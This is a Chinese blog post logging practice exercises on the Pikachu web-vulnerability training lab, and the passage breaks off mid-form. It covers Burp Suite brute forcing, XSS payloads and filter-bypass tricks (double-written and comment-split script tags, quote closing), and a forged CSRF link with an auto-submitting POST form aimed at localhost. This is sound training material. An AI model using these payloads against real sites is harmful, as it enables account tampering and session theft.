<!DOCTYPE html>
<html lang="zn-ch">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="BEACON">
    
    <title>
        
            pikachu漏洞库练习记录 |
        
        BEACON FOREVER
    </title>
    <link rel="stylesheet" href="/css/style.css">
    <link rel="shortcut icon" href="/images/BEACON13.svg">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/css/font-awesome.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zn-ch","path":"search.json"};
    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/BEACON14.png","favicon":"/images/BEACON13.svg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"于浩歌狂热之际中寒；于天上看见深渊。于一切眼中看见无所有；于无所希望中得救！"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.1"};
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
  </script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <span class="pjax-progress-icon">
            <i class="fas fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            <a class="logo-title" href="/">
                BEACON FOREVER
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                分类
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                标签
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">分类</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">标签</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">pikachu漏洞库练习记录</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/BEACON14.png">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">BEACON</span>
                        
                            <span class="author-label">∪▽∪</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i>&nbsp;2021-03-06 00:00:00
    </span>
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/WEB/">WEB</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/">练习记录</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/pikachu/">pikachu</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>9.8k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>36 分钟</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
<p>Burte Force（暴力破解）概述</p>
<p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。</p>
<p>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：</p>
<p>1.是否要求用户设置复杂的密码；</p>
<p>2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；</p>
<p>3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；</p>
<p>4.是否采用了双因素认证；</p>
<p>…等等。</p>
</blockquote>
<h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p>使用 BURPSUITE 进行暴力破解</p>
<p>爆破时，选择 Cluster bumb 模式对 Username 与 Password 进行爆破</p>
<p> Cluster bumb 模式将对爆破目标做笛卡尔积</p>
<p>此处有三个用户，分别为：</p>
<p>admin/123456</p>
<p>pikachu/000000</p>
<p>test/abc123</p>
<h2 id="验证码绕过（on-server-与-on-client）"><a href="#验证码绕过（on-server-与-on-client）" class="headerlink" title="验证码绕过（on server 与 on client）"></a>验证码绕过（on server 与 on client）</h2><p>on server</p>
<p>验证码在后台不会过期，每一次爆破皆可使用</p>
<p>爆破时在抓取的数据包中填入正确的验证码即可在每一次爆破中使用验证码</p>
<p>on client</p>
<p>验证码在前端生成并检查，可被绕过</p>
<h2 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a>token防爆破</h2><blockquote>
<p>1、Token的引入：Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。</p>
<p>2、Token的定义：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。</p>
<p>3、使用Token的目的：Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。</p>
</blockquote>
<p>后端会生成一个token值返回给客户端，当客户端进行请求时，同时携带该token</p>
<p>与服务端token比对，相同则接受</p>
<p>本题使用pitchfork进行爆破，不足是爆破点只能选择密码与token值</p>
<p>在第二个爆破点，即token值进行如下设置</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210219155221491-1293409603.png"
                      alt="img"
                ></p>
<p>然后在options中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210219155350029-1244433763.png"
                      alt="img"
                ></p>
<p>选择原token值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210219155005753-928757328.png"
                      alt="img"
                ></p>
<p>开始爆破前，需将线程数设置为1</p>
<p>由于第二个爆破选取递归爆破的方式，故线程数只能为1</p>
<p>爆破后得admin账户密码为123456</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210219155756570-535661287.png"
                      alt="img"
                ></p>
<p>该方式一极大弊端为不能连用户名一起进行爆破</p>
<p>而若连用户名一起进行爆破选择笛卡尔积模式的话</p>
<p>笔者还没能处理好token值与用户名及密码的关系</p>
<h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><p>模块详解：Intruder模块<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/u011781521/article/details/54772795" >模块详解<i class="fas fa-external-link-alt"></i></a></p>
<p>四种爆破模式：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/liweibin812/article/details/107428616" >爆破模式<i class="fas fa-external-link-alt"></i></a></p>
<p>token：<a class="link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/24825a2683e6" >什么是token<i class="fas fa-external-link-alt"></i></a></p>
<p>四种爆破模式大致如下：</p>
<p>1.sniper　对单点进行爆破，若设置多个爆破点，则使用同一字典对其分别爆破</p>
<p>2.battering ram　对多个点使用同一字典进行同时爆破</p>
<p>3.pitch-fork　对不同点使用不同字典分别爆破</p>
<p>4.cluster bomb　对不同点使用不同字典进行笛卡尔积爆破</p>
<h1 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h1><blockquote>
<p>XSS（跨站脚本）概述</p>
<p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：</p>
<p>1.反射性XSS;<br>2.存储型XSS;<br>3.DOM型XSS;</p>
<p>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。</p>
<p>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。</p>
<p>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</p>
<p>因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:<br>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;<br>输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</p>
</blockquote>
<h2 id="反射型xss（get）"><a href="#反射型xss（get）" class="headerlink" title="反射型xss（get）"></a>反射型xss（get）</h2><p>写入 ‘“&lt;&gt;bea123 测试写入的特殊字符会不会被过滤</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210221150308336-1042428670.png"
                      alt="img"
                ></p>
<p>发现没有过滤字符</p>
<p>写入xss代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;BEACON&quot;)&lt;&#x2F;script&gt; </span><br></pre></td></tr></table></figure>

<p>代码长度受限，通过代码审计修改长度即可</p>
<h2 id="反射型xss（post）"><a href="#反射型xss（post）" class="headerlink" title="反射型xss（post）"></a>反射型xss（post）</h2><p>登录后执行相同操作</p>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><blockquote>
<p>漏洞描述：xss代码被注入到后台并存储起来，构成持久性危害</p>
</blockquote>
<p>同样判断有无过滤字符</p>
<p>执行同样操作</p>
<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><blockquote>
<p>漏洞描述：前端数据被DOM获取，并通过DOM又输出到前端(危害低，不会经过后端)</p>
</blockquote>
<p>网页源代码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210221173637274-1162009598.png"
                      alt="img"
                ></p>
<p>我们先通过 ‘&gt; 闭合了herf标签，然后再插入相应的payload</p>
<p>根据提示构造payload</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<h2 id="DOM型XSS-X"><a href="#DOM型XSS-X" class="headerlink" title="DOM型XSS-X"></a>DOM型XSS-X</h2><p>网页源代码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210221174421289-1365465828.png"
                      alt="img"
                ></p>
<p>与前面不同的是，前面通过 getElementById 获取到了标签 Id 为 text的内容赋值给str</p>
<p>然后又把 str 的内容通过字符串拼接的方式写到了 a 标签的 href 属性中，a标签会写到 Id 为 dom的 div 标签中</p>
<p>这里则是定义了一个domxss函数</p>
<p>利用 window.location.search 获取浏览器中URL的内容，然后赋值给 str</p>
<p>然后经过URL解码和字符串分隔，取出URL中的参数内容</p>
<p>再把 “+” 替换为 “ ”（空格），赋值给 xss</p>
<p>最后把 xss 拼接到 a 标签中，然后写到 Id 为 dom 的 div 标签中</p>
<p>跟前面的DOM不同的是，它的输入是从浏览器的URL中获取的</p>
<h2 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h2><p>所谓盲打即所插入的内容不会在前端显示，故不能在前端得到相应的反馈</p>
<p>插入的内容在后端，若插入的xss没有被过滤，则可在后台执行</p>
<h2 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h2><p>对于xss的过滤，主要运用两种思路进行绕过</p>
<p>首先是转换，将xss命令转换为其他形式，其次则是使用编码的手段</p>
<h3 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h3><p>1.抓包重新插入，或修改前端HTML代码</p>
<p>2.修改大小写，若正则匹配只匹配小写，则可绕过</p>
<p>3.双写（拼凑），例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri&lt;script&gt;pt&gt;alert(111)&lt;&#x2F;scri&lt;&#x2F;script&gt;pt&gt;</span><br></pre></td></tr></table></figure>

<p>后台即使过滤script，也有只过滤一次的可能</p>
<p>4.注释干扰，例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri&lt;!--test--&gt;pt&gt;alert(111)&lt;&#x2F;sc&lt;!--test--&gt;ript&gt;</span><br></pre></td></tr></table></figure>

<p>加上注释后，有绕过后台过滤机制的可能</p>
<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><blockquote>
<p>核心思路：</p>
<p>后台过滤了特殊字符，比如</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>标签，但该标签可以被各种编码，后台不一定过滤</p>
<p>当浏览器对该编码进行识别时，会翻译成正常的标签，从而执行</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210223152003462-824413854.png"
                      alt="img"
                ></p>
<h2 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210223172253554-104013079.png"
                      alt="img"
                ></p>
<p> 测试输入 “‘&lt;&gt;?#’666 </p>
<p>得到反馈</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210223172520672-2025406854.png"
                      alt="img"
                ></p>
<p>发现该函数在我这里好像没有任何反应</p>
<p>而其他环境下反应应是如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210223181123424-1839070548.png"
                      alt="img"
                ></p>
<p>需要在payload前后加上单引号’用于闭合herf中的单引号</p>
<p>构造如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;alert(11111) &#39; </span><br></pre></td></tr></table></figure>

<p>而其中只能输入数字</p>
<p>两个单引号与正文需有一个空格相隔</p>
<p>后端单引号可去掉，但空格仍需要存在</p>
<h2 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h2><p>此处需了解到javascript伪协议<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/forforever/p/12711197.html" >文章地址<i class="fas fa-external-link-alt"></i></a></p>
<blockquote>
<p>伪协议不同于因特网上所真实存在的协议，如http://，https://，ftp://，</p>
<p>而是为关联应用程序而使用的.如:tencent://(关联QQ)，data:(用base64编码来在浏览器端输出二进制文件)，还有就是javascript:</p>
<p>我们可以在浏览地址栏里输入”javascript:alert(‘JS!’);”，点转到后会发现，实际上是把javascript:后面的代码当JavaScript来执行，并将结果值返回给当前页面。</p>
<p>将javascript代码添加到客户端的方法是把它放置在伪协议说明符javascript:后的URL中。这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。如果javascript:URL中的javascript代码含有多个语句，必须使用分号将这些语句分隔开。这样的URL如下所示：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:var now = new Date(); &quot;<span class="tag">&lt;<span class="name">h1</span>&gt;</span>The time is:<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>&quot; + now;</span><br></pre></td></tr></table></figure>

<p>当浏览器装载了这样的URL时，它将执行这个URL中包含的javascript代码，并把最后一条javascript语句的字符串值作为新文档的内容显示出来。这个字符串值可以含有HTML标记，并被格式化，其显示与其他装载进浏览器的文档完全相同。</p>
<p>在浏览器打开javascript：URL的时候，它会先运行URL中的代码，当返回值不为undefined的时候，前页链接会替换为这段代码的返回值。</p>
<p>javascript URL还可以含有只执行动作，但不返回值的javascript语句。例如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(&quot;hello world!&quot;)</span><br></pre></td></tr></table></figure>

<p>装载了这种URL时，浏览器仅执行其中的javascript代码，但由于没有作为新文档来显示的值，因此它并不改变当前显示的文档。</p>
<p>通常我们想用javascript:URL执行某些不改变当前显示的文档的javascript代码。要做到这一点，必须确保URL中的最后一条语句没有返回值。一种方法是用void运算符显式地把返回值指定为underfined，只需要在javascript:URL的结尾使用语句void 0;即可。例如：下面的URL将打开一个新的空浏览器窗口，而不改变当前窗口的内容：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:window.open(&quot;about:blank&quot;); void 0;</span><br></pre></td></tr></table></figure>

<p>如果这个URL没有void运算符，window.open()方法的返回值将被转换成字符串并被显示出来，当前窗口将被如下所示的文档覆盖。</p>
</blockquote>
<h2 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h2><p>网页源代码如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210223180445204-704647562.png"
                      alt="img"
                ></p>
<p>则可通过闭合前面</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>来执行我们想要的操作</p>
<p>即构造payload</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="附-1"><a href="#附-1" class="headerlink" title="附"></a>附</h2><p>xss：<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/dogecheng/p/11556221.html" >xss漏洞测试<i class="fas fa-external-link-alt"></i></a></p>
<p>xss之htmlspecialchars：<a class="link"   target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp" >PHP htmlspecialchars() 函数<i class="fas fa-external-link-alt"></i></a></p>
<p>javascript伪协议：<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/forforever/p/12711197.html" >javascript伪协议<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="XSS攻击流程"><a href="#XSS攻击流程" class="headerlink" title="XSS攻击流程"></a>XSS攻击流程</h3><p>假设存在漏洞的是一个论坛，攻击者将恶意的JS代码通过XSS漏洞插入到论文的某一页面中</p>
<p>当用户访问这个页面时，都会执行这个恶意的JS代码，这个代码就会在用户的浏览器端执行</p>
<h3 id="XSS攻击类型"><a href="#XSS攻击类型" class="headerlink" title="XSS攻击类型"></a>XSS攻击类型</h3><p>危害：存储型 &gt; 反射型 &gt; DOM型</p>
<ul>
<li>反射型：交互的数据一般不会被存在数据库里面，一次性，所见即所得，一般出现在查询页面等</li>
<li>存储型：交互的数据会被存在数据库里面，永久性存储，一般出现在留言板，注册等页面</li>
<li>DOM型：不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，一次性，也属于反射型</li>
</ul>
<h3 id="XSS形成原因"><a href="#XSS形成原因" class="headerlink" title="XSS形成原因"></a>XSS形成原因</h3><p>形成XSS漏洞的主要原因是程序中输入和输出的控制不够严格</p>
<p>导致“精心构造”的脚本输入后，在输出到前端时被浏览器当作有效代码解析执行</p>
<h3 id="XSS漏洞测试流程"><a href="#XSS漏洞测试流程" class="headerlink" title="XSS漏洞测试流程"></a>XSS漏洞测试流程</h3><p>  ① 在目标上找输入点，比如查询接口、留言板</p>
<p>  ② 输入一组 “特殊字符（&gt;，’，”等）+唯一识别字符” ，点击提交后，查看返回源码，看后端返回的数据是否有处理</p>
<p>  ③ 通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的条件（构造闭合）</p>
<p>  ④ 提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，如果成功执行则说明存在XSS漏洞</p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><blockquote>
<h3 id="CSRF-跨站请求伪造-概述"><a href="#CSRF-跨站请求伪造-概述" class="headerlink" title="CSRF(跨站请求伪造)概述"></a>CSRF(跨站请求伪造)概述</h3><p>Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。</p>
<h3 id="列举场景"><a href="#列举场景" class="headerlink" title="列举场景"></a>列举场景</h3><p>这里列举一个场景解释一下，希望能够帮助你理解。</p>
<p><strong>场景需求：</strong></p>
<p>小黑想要修改大白在购物网站tianxie<a class="link"   target="_blank" rel="noopener" href="http://www.xx.com上填写的会员地址./" >www.xx.com上填写的会员地址。<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>先看下大白是如何修改自己的密码的：</strong></p>
<p>登录—修改会员信息，提交请求—修改成功。<br>所以小黑想要修改大白的信息，他需要拥有：</p>
<p>1，登录权限 2，修改个人信息的请求。<br>但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？<br>于是他自己跑到<a href="http://www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：">www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：</a><br>【<a class="link"   target="_blank" rel="noopener" href="http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change%E3%80%91" >http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】<i class="fas fa-external-link-alt"></i></a><br>于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。<br><strong>为啥小黑的操作能够实现呢。有如下几个关键点：</strong></p>
<p>1.<a class="link"   target="_blank" rel="noopener" href="http://www.xxx.com这个网站在用户修改个人的信息时没有过多的校验,导致这个请求容易被伪造/" >www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造<i class="fas fa-external-link-alt"></i></a>;<br>—因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。<br>2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;<br>—如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。<br>—因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。<br>当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。<br>—所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：<br>–对敏感信息的操作增加安全的token；<br>–对敏感信息的操作增加安全的验证码；<br>–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p>
</blockquote>
<h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h2><p>在尝试修改个人信息界面进行如下填写并抓包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210224194152043-1176009886.png"
                      alt="img"
                ></p>
<p>直接修改链接内容让受害者点击即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210224194316858-2090277974.png"
                      alt="img"
                ></p>
<p>构造如下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=2&amp;add=3&amp;email=4&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>如若受害者在登录状态点击该链接，即可达到攻击的目的</p>
<p>get请求修改个人信息，所以内容均在url中体现，即可构造攻击连接</p>
<h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h2><p>post与get不同，不可通过构造攻击连接进行攻击</p>
<p>攻击者可以搭建一个站点，在站点上做一个表单，诱导受害者点击这个链接</p>
<p>受害者点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息</p>
<p>编写一个post.html</p>
<p>代码如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.getElementById(<span class="string">&quot;postsubmit&quot;</span>).click();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost//pikachu-master/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;girl&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0220&quot;</span> 